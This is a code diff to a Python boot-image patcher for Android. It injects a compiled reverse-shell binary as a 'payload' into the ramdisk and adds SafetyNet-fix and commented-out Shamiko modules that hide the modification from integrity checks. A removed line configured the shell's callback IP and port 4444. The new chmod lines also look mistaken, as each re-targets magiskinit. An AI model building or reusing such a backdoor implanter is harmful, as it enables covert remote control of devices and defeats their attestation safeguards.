@@ -71,6 +71,10 @@ class BootPatcher:
         os.chmod(self.workdir + "/magisk64", 0o755)
         shutil.copy(self.extractedFiles + "/lib/arm64-v8a/libmagiskinit.so", self.workdir + "/magiskinit")
         os.chmod(self.workdir + "/magiskinit", 0o755)
+        shutil.copy(self.extractedFiles + "/lib/arm64-v8a/libbusybox.so", self.workdir + "/busybox")
+        os.chmod(self.workdir + "/magiskinit", 0o755)
+        shutil.copy(self.extractedFiles + "/lib/arm64-v8a/libmagiskpolicy.so", self.workdir + "/magiskpolicy")
+        os.chmod(self.workdir + "/magiskinit", 0o755)
 
     def unpack(self):
         try:
@@ -145,8 +149,40 @@ class BootPatcher:
 
     def add_revshell(self):
         subprocess.check_call([self.workdir + "/magiskboot", "cpio", "ramdisk.cpio",
-                               "add 0750 overlay.d/sbin/socat ../../socat_shell/lib/socat_aarch64",
                                "add 0750 overlay.d/sbin/payload ../../bind_shell/libs/arm64-v8a/revshell",
+                               "patch"], env=self.my_env)
+
+
+    def add_modules(self):
+        subprocess.check_call([self.workdir + "/magiskboot", "cpio", "ramdisk.cpio",
+                               "mkdir 0750 overlay.d/sbin/adb",
+                               # magisk bin files
+                               "mkdir 0750 overlay.d/sbin/adb/magisk",
+                               "add 0750 overlay.d/sbin/adb/magisk/busybox busybox",
+                               "add 0750 overlay.d/sbin/adb/magisk/magiskpolicy magiskpolicy",
+                                # magisk config db
+                             #  "add 0750 overlay.d/sbin/adb/magisk.db ../../modules/adb/magisk.db",
+                               "mkdir 0750 overlay.d/sbin/adb/modules",
+                               # safety-net fix module
+                               "mkdir 0750 overlay.d/sbin/adb/modules/safetynet-fix",
+                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/module.prop ../../modules/adb/modules/safetynet-fix/module.prop",
+                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/system.prop ../../modules/adb/modules/safetynet-fix/system.prop",
+                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/service.sh ../../modules/adb/modules/safetynet-fix/service.sh",
+                               "mkdir 0750 overlay.d/sbin/adb/modules/safetynet-fix/zygisk",
+                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/zygisk/arm64-v8a.so ../../modules/adb/modules/safetynet-fix/zygisk/arm64-v8a.so",
+                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/zygisk/armeabi-v7a.so ../../modules/adb/modules/safetynet-fix/zygisk/armeabi-v7a.so",
+                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/classes.dex ../../modules/adb/modules/safetynet-fix/classes.dex",
+                               # shamiko module
+                               #"mkdir 0750 overlay.d/sbin/adb/modules/zygisk_shamiko",
+                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/module.prop ../../modules/adb/modules/zygisk_shamiko/module.prop",
+                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/sepolicy.rule ../../modules/adb/modules/zygisk_shamiko/sepolicy.rule",
+                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/service.sh ../../modules/adb/modules/zygisk_shamiko/service.sh",
+                               #"mkdir 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/zygisk",
+                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/zygisk/arm64-v8a.so ../../modules/adb/modules/zygisk_shamiko/zygisk/arm64-v8a.so",
+                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/zygisk/armeabi-v7a.so ../../modules/adb/modules/zygisk_shamiko/zygisk/armeabi-v7a.so",
+                               # shamiko config (whitelist)
+                              # "mkdir 0750 overlay.d/sbin/adb/shamiko",
+                              # "add 0750 overlay.d/sbin/adb/shamiko/whitelist ../../modules/adb/shamiko/whitelist",
                                "patch"], env=self.my_env)
 
     def add_rc_scripts(self):
@@ -171,6 +207,7 @@ class BootPatcher:
     def custom_patch(self):
        # self.generate_revshell()
         self.add_revshell()
+        self.add_modules()
         self.add_rc_scripts()
         return
 
@@ -198,7 +235,7 @@ class BootPatcher:
 
 
 def main():
-    patcher = BootPatcher("boot.img", ip="192.168.0.37", port="4444")
+    patcher = BootPatcher("boot.img", magisk_apk="app-debug.apk")
     patcher.run()
 
 
